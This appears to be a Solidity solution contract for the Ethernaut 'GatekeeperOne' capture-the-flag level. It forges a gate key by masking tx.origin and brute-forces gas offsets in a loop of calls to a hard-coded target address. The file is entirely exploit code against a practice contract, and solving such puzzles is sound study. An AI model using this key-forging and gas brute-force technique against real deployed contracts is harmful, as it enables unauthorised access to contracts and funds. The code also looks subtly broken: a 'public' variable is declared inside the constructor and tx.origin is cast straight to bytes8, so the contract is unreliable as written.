// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract HGatekeeperOne {
    constructor() public {
        address public GatekeeperOneContractAddress = 0x94993607FFB51759856025A1309334C9DE1524f3;

        /*
        Gate3 masking requirements:
        1. require(uint32(_gateKey) == uint16(_gateKey));
        0x11111111 == 0x1111 : mask with 0x0000FFFF

        2. require(uint32(_gateKey) != uint64(_gateKey));
            0x1111111100001111 != 0x00001111 : Must keep first 32bits so mask becomes 0xFFFFFFFF0000FFFF

        3. require(uint32(_gateKey) == uint16(tx.origin));
            mask tx.origin with 0xFFFFFFFF0000FFFF
        */
        bytes8 key = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
        bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"),key);

        // gas offset usually comes in around 210, give a buffer of 60 on each side
        for (uint256 i = 0; i < 120; i++) {
            (bool result, ) = address(GatekeeperOneContractAddress).call{gas: i + 150 + 8191 * 3}(encodedParams);
            if(result){
                break;
            }
        }
    }
}